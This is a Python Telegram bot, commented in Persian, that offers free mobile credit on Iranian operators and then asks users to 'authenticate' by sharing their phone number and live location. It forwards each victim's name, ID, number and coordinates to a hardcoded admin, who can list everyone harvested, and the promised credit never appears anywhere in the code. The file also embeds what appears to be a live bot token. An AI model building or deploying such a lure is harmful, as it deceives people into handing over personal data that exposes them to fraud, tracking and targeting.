import sys

# --- حل مشکل تایم‌زون Pydroid ---
try:
    import apscheduler.util
    apscheduler.util.astimezone = lambda obj: obj
except:
    pass
# ------------------------------

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
import logging

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# اطلاعات ثابت
user_data = {}
started_users = []
verified_users = []
ADMIN_ID = 1601379026
TOKEN = "7665440430:AAHBffJCLHnKs2n0SnEzrQS0FBS7AV-nxn8"

# دکمه‌های پنل ادمین (کیبوردی)
def get_admin_keyboard():
    keyboard = [
        [KeyboardButton("👥 کاربران استارت کرده"), KeyboardButton("✅ کاربران تایید شده")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# استارت
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_data:
        started_users.append(user_id)
        user_data[user_id] = {
            "id": user_id,
            "username": update.effective_user.username,
            "fullname": update.effective_user.full_name,
        }

    # اگر ادمین بود، فقط پنل مدیریت را ببیند (بدون موقعیت مکانی)
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            "سلام قربان! به پنل مدیریت خوش آمدید.\nاز دکمه‌های زیر برای آمار استفاده کنید:",
            reply_markup=get_admin_keyboard()
        )
        return

    # برای کاربران عادی
    buttons = [
        [InlineKeyboardButton("ایرانسل", callback_data="irancell")],
        [InlineKeyboardButton("همراه اول", callback_data="mci")],
        [InlineKeyboardButton("رایتل", callback_data="rightel")],
    ]
    await update.message.reply_text(
        "به ربات دریافت شارژ رایگان خوش آمدید!\nلطفاً اپراتور خود را انتخاب کنید:",
        reply_markup=InlineKeyboardMarkup(buttons),
    )

# مدیریت دکمه‌های پنل ادمین
async def admin_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID: return

    text = update.message.text
    
    if text == "✅ کاربران تایید شده":
        if not verified_users:
            await update.message.reply_text("هیچ کاربری هنوز تایید نشده است.")
        else:
            msg = "📋 لیست کاربران تایید شده:\n\n"
            for i, uid in enumerate(verified_users, 1):
                u = user_data.get(uid, {})
                msg += f"{i}. نام: {u.get('fullname')}\n🆔 آیدی: {uid}\n📱 شماره: {u.get('phone_number')}\n\n"
            await update.message.reply_text(msg)

    elif text == "👥 کاربران استارت کرده":
        if not started_users:
            await update.message.reply_text("لیست خالی است.")
        else:
            msg = "👥 لیست کاربران استارت کرده:\n\n"
            for i, uid in enumerate(started_users, 1):
                u = user_data.get(uid, {})
                username = f"@{u.get('username')}" if u.get('username') else "بدون یوزرنیم"
                msg += f"{i}. نام: {u.get('fullname')}\n🆔 آیدی: {uid}\n👤 یوزرنیم: {username}\n\n"
            await update.message.reply_text(msg)

async def handle_operator_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("برای دریافت شارژ، ابتدا باید احراز هویت کنید.")
    keyboard = [[KeyboardButton("ارسال شماره من", request_contact=True)]]
    await query.message.reply_text(
        "لطفاً شماره خود را ارسال کنید:",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True),
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    contact = update.message.contact
    phone = contact.phone_number

    if contact.user_id != user_id:
        await update.message.reply_text("لطفاً فقط شماره‌ی خودتان را ارسال کنید.")
        return

    # بررسی شماره ایرانی
    if not (phone.startswith("98") or phone.startswith("+98")):
        await update.message.reply_text("برای دریافت شارژ لازم است شماره متعلق به ایران باشد. 🇮🇷")
        return

    user_data[user_id]["phone_number"] = phone
    keyboard = [[KeyboardButton("ارسال موقعیت مکانی", request_location=True)]]
    await update.message.reply_text(
        "لطفاً موقعیت مکانی خود را ارسال کنید:",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True),
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    location = update.message.location
    user_data[user_id]["location"] = (location.latitude, location.longitude)
    
    if user_id not in verified_users:
        verified_users.append(user_id)
    
    await update.message.reply_text("احراز هویت با موفقیت انجام شد. ادمین‌ها در حال بررسی هستند ✅")
    
    # ارسال به ادمین
    admin_msg = (f"🔔 احراز هویت جدید:\n\n👤 نام: {user_data[user_id]['fullname']}\n"
                 f"🆔 آیدی: {user_id}\n📱 شماره: {user_data[user_id]['phone_number']}")
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)

if __name__ == "__main__":
    app = Application.builder().token(TOKEN).job_queue(None).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_operator_choice, pattern="^(irancell|mci|rightel)$"))
    # هندلر برای متن‌های دکمه ادمین
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_messages))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    
    print("--- ربات با پنل جدید ادمین فعال شد ---")
    app.run_polling(drop_pending_updates=True)
